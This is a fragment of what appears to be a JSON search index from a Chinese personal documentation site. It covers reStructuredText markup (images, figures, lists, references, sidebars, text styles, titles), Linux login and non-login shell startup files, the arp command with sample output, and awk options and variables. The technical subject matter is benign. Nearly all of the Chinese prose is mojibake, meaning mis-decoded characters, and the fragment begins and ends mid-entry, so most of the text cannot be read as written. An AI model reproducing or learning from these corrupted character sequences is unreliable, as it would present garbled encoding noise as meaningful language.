¼å¼, å¦‚html, ä¾‹: æºç : .. raw:: html <hr width=500 size=10 color=red> æ•ˆæœ","tags":"æ–‡æ¡£","url":"/yq-doc-source-docs-document-RST-mark-language-DOC-grammar-module-Miscellaneous.html","loc":"/yq-doc-source-docs-document-RST-mark-language-DOC-grammar-module-Miscellaneous.html"},{"title":"æ’å…¥å›¾ç‰‡","text":"å›¾ç‰‡æ’å…¥, æœ‰ä»¥ä¸‹æŒ‡ä»¤å¯å®ç°: image figure image å¦‚: .. image:: ../resources/images/images/2022-11-03-14-24-31.png æ”¯æŒé€‰é¡¹: height å›¾åƒé«˜åº¦ width å›¾åƒå®½åº¦ scale å›¾åƒç¼©æ”¾, ç™¾åˆ†æ¯”ã€‚ align å¯ä¸ºtop, middle, bottom, left, center, right, è®¾ç½®å›¾åƒå¯¹é½æ–¹å¼ target ç‚¹å‡»è·³è½¬ figure å¦‚: .. figure:: ../resources/images/images/2022-11-03-14-24-31.png figure å¯ä»¥è‡ªå®šä¹‰å›¾ç‰‡ç›¸å…³, é™¤äº†ä¸Šé¢, æ”¯æŒé¢å¤–é€‰é¡¹, æ”¯æŒå†™å›¾ç‰‡å¤‡æ³¨ align å¯ä¸º left, center, rightã€‚ åªèƒ½è®¾ç½®æ°´å¹³æ–¹å‘ä¸Šçš„å¯¹é½æ–¹å¼ figwidth è®¾ç½®å›¾åƒå®½åº¦, è¿™å°†å½±å“å›¾åƒæ ‡é¢˜å’Œå›¾ä¾‹çš„æŠ˜è¡Œæ–¹å¼, ä»¥ç¡®ä¿å®ƒä»¬çš„å®½åº¦ä¸ä¼šè¶…è¿‡è¿™ä¸ªå€¼ã€‚ ä½†æ˜¯è¿™å¹¶ä¸å½±å“å†…åµŒçš„å›¾ç‰‡å®½åº¦, å›¾ç‰‡çš„å®½åº¦éœ€è¦ç”¨ width é€‰é¡¹è®¾ç½®: +---------------------------+ | figure | | | |<------ figwidth --------->| | | | +---------------------+ | | | image | | | | | | | |<--- width --------->| | | +---------------------+ | | | |The figure's caption should| |wrap at this width. | +---------------------------+","tags":"æ–‡æ¡£","url":"/yq-doc-source-docs-document-RST-mark-language-Grammar-module-Insert-picture.html","loc":"/yq-doc-source-docs-document-RST-mark-language-Grammar-module-Insert-picture.html"},{"title":"åˆ—è¡¨","text":"ç¬¦å·åˆ—è¡¨ å¯ç”¨ç¬¦å·: -ã€*ã€+ æ— åºåˆ—è¡¨: - hhhhhhhh - hhhhhhhh - hhhhhhhh - hhhhhhhh - hhhhhhhh - hhhhhhhh æœ‰åºåˆ—è¡¨, æ”¯æŒæ•°å­—ã€å¤§å°å†™å­—æ¯å’Œç½—é©¬æ•°å­—: 1. hhhhhhhh #. hhhhhhhh #. hhhhhhhh #. hhhhhhhh #. hhhhhhhh #. hhhhhhhh a. hhhhhhhh #. hhhhhhhh #. hhhhhhhh #. hhhhhhhh #. hhhhhhhh #. hhhhhhhh","tags":"æ–‡æ¡£","url":"/yq-doc-source-docs-document-RST-mark-language-Grammar-module-List.html","loc":"/yq-doc-source-docs-document-RST-mark-language-Grammar-module-List.html"},{"title":"å¼•ç”¨","text":"å†…éƒ¨å¼•ç”¨ å³åœ¨åŒä¸€ä¸ªæ–‡ä»¶å†…çš„å¼•ç”¨ å¯¹äºåŒæ–‡ä»¶å†…çš„æ‰€æœ‰æ ‡é¢˜, ä¼šè‡ªåŠ¨å­˜åœ¨å¼•ç”¨é“¾æ¥ å¦‚æœ‰ä¸€ä¸ªå°èŠ‚: å°èŠ‚1 =================== å¯ä»¥ç›´æ¥ åŠ åä¸‹åˆ’çº¿ å¼•ç”¨: å°èŠ‚1_ æ³¨è§£ é»˜è®¤ä»…å¯ç”¨äºå½“å‰rstæ–‡æœ¬ . è‹¥éœ€è¦æ”¯æŒå°èŠ‚èƒ½è¢«æ‰€æœ‰æ–‡æ¡£å¼•ç”¨, éœ€è¦åœ¨conf.py é…ç½® sphinx.ext.autosectionlabel . ä¸å»ºè®®è¿™ä¹ˆåš, å› ä¸ºå¦‚æœå­˜åœ¨é‡å¤æ ‡é¢˜ä¼šæœ‰å†²çª. å…¨æ–‡å¼•ç”¨-æ ‡ç­¾å¼•ç”¨ å¼•ç”¨æŸä¸€ä¸ªä½ç½® ä¸ä»…å¯ç”¨äºåŒä¸€ä¸ªæ–‡ä»¶å†…, è¿˜å¯ç”¨åœ¨åŒæ–‡æ¡£é¡¹ç›®çš„å…¶ä»–æ–‡ä»¶ ç›®æ ‡ä½ç½®(è¢«å¼•ç”¨ä½ç½®)å½¢å¼: .. _è¿™æ˜¯ä¸€ä¸ªå¼•ç”¨2: å¼•ç”¨ä½ç½®çš„å†™æ³•1(ä¸ä¸Šä¸€èŠ‚ä¸€è‡´): è¿™æ˜¯ä¸€ä¸ªå¼•ç”¨2_ å¼•ç”¨ä½ç½®çš„å†™æ³•2, ä½¿ç”¨ ref :ref:`è¿™æ˜¯ä¸€ä¸ªå¼•ç”¨2` . æ³¨è§£ ref æ”¯æŒè·¨æ–‡æ¡£å¼•ç”¨, ä½†æ˜¯è¦æ³¨æ„å¤¸æ–‡æ¡£å¼•ç”¨å®šä¹‰çš„æ ‡ç­¾å¿…é¡»åœ¨æ ‡é¢˜å‰é¢(è¿™ä¸ªç¡®å®š), æˆ–è€…åœ¨æ ‡ç­¾ä¸‹å®šä¹‰å…¶å†…å®¹ç»“æ„(è¿™ä¸ªè¿˜æ²¡è¯•è¿‡), å¦åˆ™è·¨æ–‡æ¡£æ—¶æ— æ³•æ‰¾åˆ° æ³¨æ„ ref é»˜è®¤æ˜¯æ‰¾çš„æ˜¯ title ä¸ caption, éœ€è¦æ”¯æŒå°èŠ‚çš„è¯, éœ€è¦åœ¨å°èŠ‚å‰é¢å®šä¹‰åˆ«åå¦‚ä¸‹ æˆ–è€…ä½¿ç”¨å†…ç½®æ‹“å±•æ’ä»¶ sphinx.ext.autosectionlabel ç›´æ¥æ”¯æŒå°èŠ‚ å…¨æ–‡å¼•ç”¨-å¼•ç”¨æ•´ä¸ªæ–‡æ¡£ å¼•ç”¨æ•´ä¸ªæ–‡æ¡£ ä½¿ç”¨docæŒ‡ä»¤, ç›´æ¥å¼•ç”¨rstæ–‡æ¡£(å†’å·åæ— ç©ºæ ¼): :doc:`å¼•ç”¨pytest, test <../python/Pytest>`. :doc:`../python/Pytest`. è¶…é“¾æ¥ ä¸»è¦ç”¨äºå¼•ç”¨å¤–éƒ¨ç½‘å€ å¦‚é“¾æ¥åˆ°ç™¾åº¦: `ç™¾åº¦ <https://www.baidu.com>`_ æ­¤æ—¶ ç™¾åº¦ ä¼šè¢«è¯†åˆ«ä¸ºä¸€ä¸ª target , æ³¨æ„è¿™ä¸ª target ä¸è¦æœ‰é‡å¤ æ•ˆæœ: ç™¾åº¦ ç”±äºå­˜åœ¨ target , æ•…å¯å®šä¹‰åœ¨å…¶ä»–åœ°æ–¹: `ç™¾åº¦`_ æ•ˆæœ, ç™¾åº¦ æˆ–è€…æå‰å®šä¹‰ç½‘å€: .. _ç™¾åº¦: https://www.baidu.com","tags":"æ–‡æ¡£","url":"/yq-doc-source-docs-document-RST-mark-language-Grammar-module-Quote.html","loc":"/yq-doc-source-docs-document-RST-mark-language-Grammar-module-Quote.html"},{"title":"ä¾§è¾¹æ ","text":"ä½¿ç”¨ sidebar æ¨¡å— Optional Sidebar Title Optional Sidebar Subtitle Subsequent indented lines comprise the body of the sidebar, and are interpreted as body elements. æºç : .. sidebar:: Optional Sidebar Title :subtitle: Optional Sidebar Subtitle Subsequent indented lines comprise the body of the sidebar, and are interpreted as body elements. å†æœ‰ä¸€ä¸ªå…¶ä»–çš„å•¥","tags":"æ–‡æ¡£","url":"/yq-doc-source-docs-document-RST-mark-language-Grammar-module-Sidebar.html","loc":"/yq-doc-source-docs-document-RST-mark-language-Grammar-module-Sidebar.html"},{"title":"æ–‡æœ¬æ ·å¼","text":"æ˜Ÿå· å•æ˜Ÿå·è¡¨ç¤ºæ–œä½“ å•æ˜Ÿå·, å­—ä½“æ–œä½“ . æºç : *å•æ˜Ÿå·, å­—ä½“æ–œä½“* åŒæ˜Ÿå·è¡¨ç¤ºåŠ ç²— åŒæ˜Ÿå·, å­—ä½“ç²—ä½“ . æºç : **åŒæ˜Ÿå·, å­—ä½“ç²—ä½“** åå¼•å· å•åå¼•å·, è¡¨ç¤ºæ–œä½“ æºç : `å•åå¼•å·, è¡¨ç¤ºæ–œä½“` åŒåå¼•å·, ä»£ç ç¤ºä¾‹/è¡Œå†…æ–‡æœ¬. è¯´æ˜: é€šå¸¸æ˜¾ç¤ºä¸ºç­‰å®½æ–‡æœ¬, ç©ºæ ¼å¯ä»¥ä¿ç•™, æ¢è¡Œä¸ä¿ç•™ æºç : ``åŒåå¼•å·, ä»£ç ç¤ºä¾‹/è¡Œå†…æ–‡æœ¬. è¯´æ˜: é€šå¸¸æ˜¾ç¤ºä¸ºç­‰å®½æ–‡æœ¬, ç©ºæ ¼å¯ä»¥ä¿ç•™, æ¢è¡Œä¸ä¿ç•™``","tags":"æ–‡æ¡£","url":"/yq-doc-source-docs-document-RST-mark-language-Grammar-module-Text-style.html","loc":"/yq-doc-source-docs-document-RST-mark-language-Grammar-module-Text-style.html"},{"title":"æ®µè½","text":"æ®µè½æ˜¯è¢«ç©ºè¡Œåˆ†å‰²çš„æ–‡å­—ç‰‡æ®µ, å·¦ä¾§å¿…é¡»å¯¹é½ï¼ˆæ²¡æœ‰ç©ºæ ¼, æˆ–è€…æœ‰ç›¸åŒå¤šçš„ç©ºæ ¼ï¼‰ã€‚ ç¼©è¿›çš„æ®µè½è¢«è§†ä¸ºå¼•æ–‡ã€‚","tags":"æ–‡æ¡£","url":"/yq-doc-source-docs-document-RST-mark-language-Grammar-module-paragraph.html","loc":"/yq-doc-source-docs-document-RST-mark-language-Grammar-module-paragraph.html"},{"title":"æ ‡é¢˜","text":"æ ‡é¢˜å¯ä»¥ç”¨è¿ç»­çš„ç¬¦å·ä¸‹çº¿è¡¨ç¤º, ä¸Šçº¿å¯æœ‰å¯æ— : ========================= å¯ä»¥ä½¿ç”¨çš„æ ‡é¢˜ç¬¦å·æœ‰ =ã€-ã€`ã€:ã€'ã€\"ã€~ã€&#94;ã€_ ã€* ã€+ã€ #ã€<ã€> , æ³¨æ„: é•¿åº¦å¤§äºæ ‡é¢˜é•¿åº¦, è¿ç»­ä½¿ç”¨è¡¨ç¤ºåŒçº§æ ‡é¢˜, ä¸åŒçš„ç¬¦å·ä½¿ç”¨è¡¨ç¤ºä¸‹ä¸€çº§æ ‡é¢˜ å¯¹äºç›¸åŒçš„ç¬¦å·, æœ‰ä¸Šæ ‡æ˜¯ä¸€çº§æ ‡é¢˜, æ²¡æœ‰ä¸Šæ ‡æ˜¯äºŒçº§æ ‡é¢˜ (ä¸€çº§æ ‡é¢˜ä¸Šä¸‹æ ‡éƒ½è¦æœ‰)ã€‚ æ ‡é¢˜æœ€å¤šåˆ†å…­çº§","tags":"æ–‡æ¡£","url":"/yq-doc-source-docs-document-RST-mark-language-Grammar-module-title.html","loc":"/yq-doc-source-docs-document-RST-mark-language-Grammar-module-title.html"},{"title":"Reactç»„ä»¶åº“","text":"","tags":"å‰ç«¯","url":"/yq-doc-source-docs-front-end-frame-react-Component-library-index.html","loc":"/yq-doc-source-docs-front-end-frame-react-Component-library-index.html"},{"title":"shellç±»å‹","text":"å¤§è‡´ä¸ /docs/æ“ä½œç³»ç»Ÿ/linux/æ¦‚å¿µæ€§/linuxç³»ç»Ÿç¯å¢ƒåŠ è½½é¡ºåº ä¸€è‡´ ç™»å½•shell äº¤äº’å¼ç™»é™† ç›´æ¥é€šè¿‡ç»ˆç«¯è¾“å…¥ç”¨æˆ·ä¿¡æ¯ç™»é™†ç³»ç»Ÿ å¦‚: su - username #æˆ– su -l username é…ç½®æ–‡ä»¶è¯»å–è¿‡ç¨‹: /etc/profile --> /etc/profile.d/*.sh --> ~/.bash_profile --> /etc/bashrc äº¤äº’å¼ç™»å½•shell: Bash reads and executes the /etc/profile (if it exists). After reading that file, it looks for ~/.bash_profile, ~/.bash_login, and ~/.profile in that order, and reads and executes the first one (that exists and is readable). When a login shell exits: Bash reads and executes ~/.bash_logout (if it exists). éäº¤äº’å¼ç™»é™† å›¾å½¢ç•Œé¢çš„ç»ˆç«¯ æ‰§è¡Œè„šæœ¬ å¦‚: su username é…ç½®æ–‡ä»¶è¯»å–è¿‡ç¨‹: ~/.bashrc/ --> /etc/bash_rc --> /etc/profile.d/*.sh äº¤äº’å¼éç™»é™†shell: Bash reads and executes ~/.bashrc (if it exists) ç™»é™†Linuxçš„æ—¶å€™æ‰§è¡Œçš„æ–‡ä»¶è¿‡ç¨‹: /etc/profile --> (~/.bash_profile | ~/.bash_login | ~/.profile) --> ~/.bashrc --> /etc/bashrc --> ~/.bash_logout å‚è€ƒ: http://groups.google.com/group/linux.debian.user/browse_thread/thread/2b71ecfc45789958/7bff24e3bae74b36?lnk=raot è¯¦åŠ è½½é¡ºåºå¯è§ /docs/æ“ä½œç³»ç»Ÿ/linux/æ¦‚å¿µæ€§/linuxç³»ç»Ÿç¯å¢ƒåŠ è½½é¡ºåº é€‰é¡¹/å‚æ•° çŸ­é€‰é¡¹(å‚æ•°) çŸ­æ¨ªçº¿åŠ å­—æ¯, å¦‚: -h -a $option_arg é•¿é€‰é¡¹(å‚æ•°) åŒçŸ­æ¨ªçº¿åŠ å•è¯, å¦‚: --help --add $option_arg æ™®é€šå‚æ•° ç›´æ¥è·Ÿåœ¨åé¢çš„, å¦‚: 'commit msg' æˆ–è€…ç›´æ¥ä»¥åŒçŸ­æ¨ªçº¿å¼€å§‹ä½œä¸ºåˆ†éš”ç¬¦çš„, å¦‚: # ä¸¤ä¸ªæ¨ªçº¿åé¢çš„éƒ¨åˆ†éƒ½ä¼šè¢«è®¤ä¸ºæ˜¯å‚æ•°äº†ï¼Œè€Œä¸å†æ˜¯å‰é¢çš„å‘½ä»¤çš„é€‰é¡¹äº† -- 'commit msg' # å•æ¨ªçº¿ä¹Ÿå¯ä»¥å…¶å® - 'commit msg' æ³¨è§£ bashçš„man page: A -- signals the end of options and disables further option processing. Any arguments after the -- are treated as filenames and arguments. An argument of - is equivalent to --.","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Conceptual-shell-type.html","loc":"/yq-doc-source-docs-operating-system-linux-Conceptual-shell-type.html"},{"title":"arp","text":"arp å‘½ä»¤ç”¨äºæ˜¾ç¤ºå’Œä¿®æ”¹ IP åˆ° MAC è½¬æ¢è¡¨ arp å‘½ä»¤ æ˜¯ Address Resolution Protocolï¼Œåœ°å€è§£æåè®®ï¼Œ æ˜¯é€šè¿‡è§£æç½‘ç»œå±‚åœ°å€æ¥æ‰¾å¯»æ•°æ®é“¾è·¯å±‚åœ°å€çš„ä¸€ä¸ªç½‘ç»œåè®®åŒ…ä¸­æå…¶é‡è¦çš„ç½‘ç»œä¼ è¾“åè®®ã€‚ è€Œè¯¥å‘½ä»¤å¯ä»¥æ˜¾ç¤ºå’Œä¿®æ”¹ arp åè®®è§£æè¡¨ä¸­çš„ç¼“å†²æ•°æ®ã€‚ è¿™ä¸ªæ ¸å¿ƒåè®®æ¨¡å—å®ç°RFC826ä¸­å®šä¹‰çš„ Address Resolution Protocol [è¯‘æ³¨ï¼šå³TCP/IPçš„ç¬¬ä¸‰å±‚åˆ°ç¬¬ä¸€å±‚çš„åœ°å€è½¬æ¢åè®®]ï¼Œ ç”¨äºåœ¨ç›´æ¥ç›¸è¿çš„ç½‘ç»œä¸­æ¢ç¬¬äºŒå±‚ç¡¬ä»¶åœ°å€å’Œ Ipv4 åè®®åœ°å€ä¹‹é—´çš„è½¬æ¢ã€‚ ç”¨æˆ·é™¤éæƒ³å¯¹å…¶è¿›è¡Œé…ç½®ï¼Œå¦åˆ™ä¸€èˆ¬ä¸ä¼šç›´æ¥æ“ä½œè¿™ä¸ªæ¨¡å—ã€‚ å®é™…ä¸Šï¼Œå®ƒæä¾›å¯¹æ ¸å¿ƒä¸­å…¶å®ƒåè®®çš„æœåŠ¡ã€‚ ç”¨æˆ·è¿›ç¨‹å¯ä»¥ä½¿ç”¨ packet(7) çš„ socketsï¼Œæ”¶åˆ° ARP åŒ…ï¼ˆè¯‘æ³¨ï¼šä¸€è¯‘åˆ†ç»„ï¼‰ã€‚ è¿˜æœ‰ä¸€ç§æœºåˆ¶æ˜¯ä½¿ç”¨ netlink(7) socketsï¼Œåœ¨ç”¨æˆ·ç©ºé—´ç®¡ç† ARP ç¼“å­˜çš„æœºåˆ¶ã€‚ æˆ‘ä»¬ä¹Ÿå¯ä»¥é€šè¿‡ ioctl (2) æ§åˆ¶ä»»æ„ PF_INET socketä¸Šçš„ ARP è¡¨ ARP æ¨¡å—ç»´æŠ¤ä¸€ä¸ªç¡¬ä»¶åœ°å€åˆ°åè®®åœ°å€æ˜ å°„çš„ç¼“å­˜ã€‚ è¿™ä¸ªç¼“å­˜æœ‰å¤§å°é™åˆ¶ï¼Œæ‰€ä»¥ä¸å¸¸ç”¨çš„å’Œæ—§çš„è®°å½•ï¼ˆEntryï¼‰å°†è¢«åƒåœ¾æ”¶é›†å™¨æ¸…é™¤ï¼ˆgarbage-collectedï¼‰ï¼Œ åƒåœ¾æ”¶é›†å™¨æ°¸è¿œä¸èƒ½åˆ é™¤æ ‡ä¸ºæ°¸ä¹…çš„è®°å½•ã€‚ æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ioctlsç›´æ¥æ“çºµç¼“å†²ï¼Œ å¹¶ä¸”å…¶æ€§çŠ¶å¯ä»¥ç”¨ä¸‹é¢å®šä¹‰çš„ sysctl è°ƒèŠ‚ã€‚ å¦‚æœåœ¨é™å®šçš„æ—¶é—´ï¼ˆè§ä¸‹é¢çš„sysctlï¼‰å†…ï¼Œä¸€æ¡ç°å­˜æ˜ å°„æ²¡æœ‰è‚¯å®šåé¦ˆæ—¶ï¼Œ åˆ™è®¤ä¸ºç›¸é‚»å±‚çš„ç¼“å­˜è®°å½•å¤±æ•ˆã€‚ ä¸ºäº†å†æ¬¡å‘ç›®æ ‡å‘é€æ•°æ®ï¼ŒARPå°†é¦–å…ˆè¯•ç€è¯¢é—®æœ¬åœ°arpè¿›ç¨‹ app_solicit æ¬¡ï¼Œ è·å–æ›´æ–°äº†çš„ MACï¼ˆä»‹è´¨è®¿é—®æ§åˆ¶ï¼‰åœ°å€ã€‚ å¦‚æœå¤±è´¥ï¼Œå¹¶ä¸”æ—§çš„MACåœ°å€æ˜¯å·²çŸ¥çš„ï¼Œåˆ™å‘é€ ucast_solicit æ¬¡çš„ unicast probeã€‚ å¦‚æœä»ç„¶å¤±è´¥ï¼Œåˆ™å°†å‘ç½‘ç»œå¹¿æ’­ä¸€ä¸ªæ–°çš„ARPè¯·æ±‚,æ­¤æ—¶è¦ æœ‰å¾…å‘é€æ•°æ®çš„é˜Ÿåˆ— å¦‚æœ Linux æ¥åˆ°ä¸€ä¸ªåœ°å€è¯·æ±‚ï¼Œè€Œä¸”è¯¥åœ°å€æŒ‡å‘ Linux è½¬å‘çš„åœ°å€ï¼Œ å¹¶ä¸”æ¥æ”¶æ¥å£æ‰“å¼€äº†ä»£ç† arp æ—¶ï¼ŒLinux å°†è‡ªåŠ¨æ·»åŠ ä¸€æ¡éæ°¸ä¹…çš„ä»£ç† arp è®°å½•ï¼› å¦‚æœå­˜åœ¨æ‹’ç»åˆ°ç›®æ ‡çš„è·¯ç”±ï¼Œåˆ™ä¸æ·»åŠ ä»£ç† arp è®°å½•ã€‚ è¯­æ³•: arpï¼ˆé€‰é¡¹ï¼‰ï¼ˆå‚æ•°ï¼‰ é€‰é¡¹ -a ä¸»æœº ï¼šæ˜¾ç¤º arp ç¼“å†²åŒºçš„æ‰€æœ‰æ¡ç›®ï¼› -H åœ°å€ç±»å‹ ï¼šæŒ‡å®š arp æŒ‡ä»¤ä½¿ç”¨çš„åœ°å€ç±»å‹ï¼› -D ä½¿ç”¨æŒ‡å®šæ¥å£çš„ç¡¬ä»¶åœ°å€ï¼› -e ä»¥ Linux çš„æ˜¾ç¤ºé£æ ¼æ˜¾ç¤º arp ç¼“å†²åŒºä¸­çš„æ¡ç›®ï¼› -f æ–‡ä»¶ ï¼šè®¾ç½®ä¸»æœºçš„ IP åœ°å€ä¸ MAC åœ°å€çš„é™æ€æ˜ å°„ã€‚ -n ä»¥æ•°å­—æ–¹å¼æ˜¾ç¤º arp ç¼“å†²åŒºä¸­çš„æ¡ç›®ï¼› -v æ˜¾ç¤ºè¯¦ç»†çš„ arp ç¼“å†²åŒºæ¡ç›®ï¼ŒåŒ…æ‹¬ç¼“å†²åŒºæ¡ç›®çš„ç»Ÿè®¡ä¿¡æ¯ï¼› -s <ä¸»æœº> <MACåœ°å€> ä¸»æœº MAC åœ°å€ ï¼šè®¾ç½®æŒ‡å®šçš„ä¸»æœºçš„ IP åœ°å€ä¸ MAC åœ°å€çš„é™æ€æ˜ å°„ï¼› -d <ä¸»æœº> ä¸»æœº ï¼šä» arp ç¼“å†²åŒºä¸­åˆ é™¤æŒ‡å®šä¸»æœºçš„ arp æ¡ç›®ï¼› -i <æ¥å£> æ¥å£ ï¼šæŒ‡å®šè¦æ“ä½œ arp ç¼“å†²åŒºçš„ç½‘ç»œæ¥å£ï¼› å¦‚: [root@cs6 ~]# arp -n Address HWtype HWaddress Flags Mask Iface 10.0.0.1 ether 00:50:56:c0:00:08 C eth0 10.0.0.2 ether 00:50:56:f4:fb:52 C eth0 å‘½ä»¤è¯´æ˜å…·ä½“å¦‚ä¸‹ Address ä¸»æœºåœ°å€ã€‚ Hwtype ç¡¬ä»¶ç±»å‹ã€‚ Hwaddress ç¡¬ä»¶åœ°å€ã€‚ Flags Mask è®°å½•æ ‡å¿—ï¼Œ\"C\"è¡¨ç¤ºarpé«˜é€Ÿç¼“å­˜ä¸­çš„æ¡ç›®ï¼Œ\"M\"è¡¨ç¤ºé™æ€çš„arpæ¡ç›®ã€‚ lface ç½‘ç»œæ¥å£ã€‚","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-ARP.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-ARP.html"},{"title":"awk","text":"æ–‡æœ¬å’Œæ•°æ®è¿›è¡Œå¤„ç†çš„ç¼–ç¨‹è¯­è¨€ é€‰é¡¹å‚æ•°: -F <fs> fsæŒ‡å®šåˆ†å‰²ç¬¦ -v<var= value> èµ‹å€¼ä¸€ä¸ªç”¨æˆ·å˜é‡ï¼Œå°†å¤–éƒ¨å˜é‡ä¼ é€’ç»™awk -f <script> ä»è„šæœ¬æ–‡ä»¶ä¸­è¯»å–awkå‘½ä»¤ -m <[fr] val> å¯¹valå€¼è®¾ç½®å†…åœ¨é™åˆ¶ï¼Œ-mfé€‰é¡¹é™åˆ¶åˆ†é…ç»™valçš„æœ€å¤§å—æ•°ç›®ï¼›-mré€‰é¡¹é™åˆ¶è®°å½•çš„æœ€å¤§æ•°ç›®ã€‚è¿™ä¸¤ä¸ªåŠŸèƒ½æ—¶Bellå®éªŒå®¤awkæ‹“å±•çš„åŠŸèƒ½ï¼Œåœ¨æ ‡å‡†awkä¸é€‚ç”¨ã€‚ å…¶ä»–: $n å½“å‰è®°å½•çš„ç¬¬nä¸ªå­—æ®µï¼Œ$å¼€å¤´éƒ½è¡¨ç¤ºå­—æ®µ æ¨¡å¼ /æ­£åˆ™è¡¨è¾¾å¼/ï¼šä½¿ç”¨é€šé…ç¬¦çš„æ‹“å±•é›† å…³ç³»è¡¨è¾¾å¼ï¼šä½¿ç”¨è¿ç®—ç¬¦è¿›è¡Œæ“ä½œï¼Œå¯ä»¥æ˜¯å­—ç¬¦ä¸²æˆ–æ•°å­—çš„æ¯”è¾ƒæµ‹è¯• æ¨¡å¼åŒ¹é…è¡¨è¾¾å¼ï¼šç”¨è¿ç®—ç¬¦ ~ ï¼ˆåŒ¹é…ï¼‰å’Œ !~ ï¼ˆä¸åŒ¹é…ï¼‰ BEGIBè¯­å¥å—ã€patternè¯­å¥å—ã€ENDè¯­å¥å—ï¼šå‚è§awkçš„å·¥ä½œåŸç† æ³¨è§£ è¯­å¥å—çš„ä¹¦å†™, æœ€å¤–å±‚ä¸€å®šæ˜¯å•å¼•å·åŒ…è£¹, å¦‚: $ echo \"mysql <none> 57da161f45ac 12 months ago 517MB\" | awk '{print $3}' 57da161f45ac å› ä¸ºå…¶å†…éƒ¨æ˜¯è„šæœ¬å†…å®¹, ç”¨åŒå¼•å·, ä¼šå°±åœ°è§£æ, æ¯”å¦‚è¿™é‡Œå°±æ˜¯ $3 è§£ææˆå½“å‰çš„å‚æ•° awkå†…ç½®å˜é‡ï¼ˆé¢„å®šä¹‰å˜é‡ï¼‰ å¸¸ç”¨ NF å­—æ®µä¸ªæ•°ï¼Œï¼ˆè¯»å–çš„åˆ—æ•°ï¼‰ æ¯ä¸€è¡Œ $0 æ‹¥æœ‰çš„å­—æ®µæ€»æ•° NR è®°å½•æ•°ï¼ˆè¡Œå·ï¼‰ï¼Œä»1å¼€å§‹ï¼Œæ–°çš„æ–‡ä»¶å»¶ç»­ä¸Šé¢çš„è®¡æ•°ï¼Œæ–°æ–‡ä»¶ä¸ä»1å¼€å§‹. ç›®å‰awkæ‰€å¤„ç†çš„ç¬¬å‡ è¡Œçš„æ•°æ® FNR è¯»å–æ–‡ä»¶çš„è®°å½•æ•°ï¼ˆè¡Œå·ï¼‰ï¼Œä»1å¼€å§‹ï¼Œæ–°çš„æ–‡ä»¶é‡æ–°ä»1å¼€å§‹è®¡æ•° FS(Field Separator) è¾“å…¥å­—æ®µåˆ†éš”ç¬¦ï¼Œé»˜è®¤æ˜¯ç©ºæ ¼ OFS(Out of Field Separator) è¾“å‡ºå­—æ®µåˆ†éš”ç¬¦ é»˜è®¤ä¹Ÿæ˜¯ç©ºæ ¼ RS(Record Separator) è¾“å…¥è¡Œåˆ†éš”ç¬¦ï¼Œé»˜è®¤ä¸ºæ¢è¡Œç¬¦ ORS(Output Record Separate) è¾“å‡ºè¡Œåˆ†éš”ç¬¦ï¼Œé»˜è®¤ä¸ºæ¢è¡Œç¬¦ æ³¨è§£ RSã€ORSã€FSã€OFSçš„è‹±æ–‡è§£é‡Šç»ä¸æ˜¯è¿™æ ·çš„ï¼Œè¿™é‡Œåªæ˜¯è§£é‡Šæ¸…æ¥šã€‚å»ºè®®å»é˜…è¯»awkçš„è‹±æ–‡è¯»ç‰©ï¼Œå…¶ä¸­è§£é‡Šäº†ç¼©å†™çš„å«ä¹‰ å…¶ä»–å‚è€ƒ å…³äºFieldä¸Record æ‰€æœ‰ è¯´æ˜ï¼šANPGè¡¨ç¤ºç¬¬ä¸€ä¸ªæ”¯æŒå˜é‡çš„å·¥å…·ï¼Œ[A]=awkã€[N]=nawkã€[P]=POSIXawkã€[G]=gawk: $n å½“å‰è®°å½•çš„ç¬¬nä¸ªå­—æ®µï¼Œæ¯”å¦‚nä¸º1è¡¨ç¤ºç¬¬ä¸€ä¸ªå­—æ®µï¼Œnä¸º2è¡¨ç¤ºç¬¬äºŒä¸ªå­—æ®µã€‚ $0 è¿™ä¸ªå˜é‡åŒ…å«æ‰§è¡Œè¿‡ç¨‹ä¸­å½“å‰è¡Œçš„æ–‡æœ¬å†…å®¹ã€‚ [N] ARGC å‘½ä»¤è¡Œå‚æ•°çš„æ•°ç›®ã€‚ [G] ARGIND å‘½ä»¤è¡Œä¸­å½“å‰æ–‡ä»¶çš„ä½ç½®ï¼ˆä»0å¼€å§‹ç®—ï¼‰ã€‚ [N] ARGV åŒ…å«å‘½ä»¤è¡Œå‚æ•°çš„æ•°ç»„ã€‚ [G] CONVFMT æ•°å­—è½¬æ¢æ ¼å¼ï¼ˆé»˜è®¤å€¼ä¸º%.6gï¼‰ã€‚ [P] ENVIRON ç¯å¢ƒå˜é‡å…³è”æ•°ç»„ã€‚ [N] ERRNO æœ€åä¸€ä¸ªç³»ç»Ÿé”™è¯¯çš„æè¿°ã€‚ [G] FIELDWIDTHS å­—æ®µå®½åº¦åˆ—è¡¨ï¼ˆç”¨ç©ºæ ¼é”®åˆ†éš”ï¼‰ã€‚ [A] FILENAME å½“å‰è¾“å…¥æ–‡ä»¶çš„åã€‚ [P] FNR åŒNRï¼Œä½†ç›¸å¯¹äºå½“å‰æ–‡ä»¶ã€‚ [A] FS å­—æ®µåˆ†éš”ç¬¦ï¼ˆé»˜è®¤æ˜¯ä»»ä½•ç©ºæ ¼ï¼‰ã€‚ [G] IGNORECASE å¦‚æœä¸ºçœŸï¼Œåˆ™è¿›è¡Œå¿½ç•¥å¤§å°å†™çš„åŒ¹é…ã€‚ [A] NF è¡¨ç¤ºå­—æ®µæ•°ï¼Œåœ¨æ‰§è¡Œè¿‡ç¨‹ä¸­å¯¹åº”äºå½“å‰çš„å­—æ®µæ•°ã€‚ [A] NR è¡¨ç¤ºè®°å½•æ•°ï¼Œåœ¨æ‰§è¡Œè¿‡ç¨‹ä¸­å¯¹åº”äºå½“å‰çš„è¡Œå·ã€‚ [A] OFMT æ•°å­—çš„è¾“å‡ºæ ¼å¼ï¼ˆé»˜è®¤å€¼æ˜¯%.6gï¼‰ã€‚ [A] OFS è¾“å‡ºå­—æ®µåˆ†éš”ç¬¦ï¼ˆé»˜è®¤å€¼æ˜¯ä¸€ä¸ªç©ºæ ¼ï¼‰ã€‚ [A] ORS è¾“å‡ºè®°å½•åˆ†éš”ç¬¦ï¼ˆé»˜è®¤å€¼æ˜¯ä¸€ä¸ªæ¢è¡Œç¬¦ï¼‰ã€‚ [A] RS 